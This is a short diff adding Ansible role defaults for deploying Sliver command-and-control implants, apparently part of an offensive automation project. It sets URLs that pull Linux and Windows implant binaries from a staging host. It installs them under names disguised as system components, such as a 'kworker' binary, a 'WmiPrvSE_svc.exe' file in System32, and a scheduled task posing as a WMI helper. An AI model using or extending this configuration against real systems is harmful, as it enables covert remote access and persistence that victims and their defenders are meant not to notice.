@@ -1,0 +1,11 @@
+# Sliver role defaults — override in group_vars/all.yml or at playbook level
+# Implant filenames must match what was exported from your Sliver C2 server
+sliver_linux_binary_url:   "http://{{ staging_ip }}:{{ staging_port }}/sliver-implant-linux"
+sliver_windows_binary_url: "http://{{ staging_ip }}:{{ staging_port }}/sliver-implant.exe"
+
+sliver_linux_bin_path:     "/usr/local/bin/kworker"
+sliver_windows_bin_path:   'C:\Windows\System32\WmiPrvSE_svc.exe'
+
+sliver_linux_service_name:   "kworker-svc"
+sliver_windows_task_name:    "WMI Performance Adapter Helper"
+sliver_windows_process_name: "WmiPrvSE_svc"
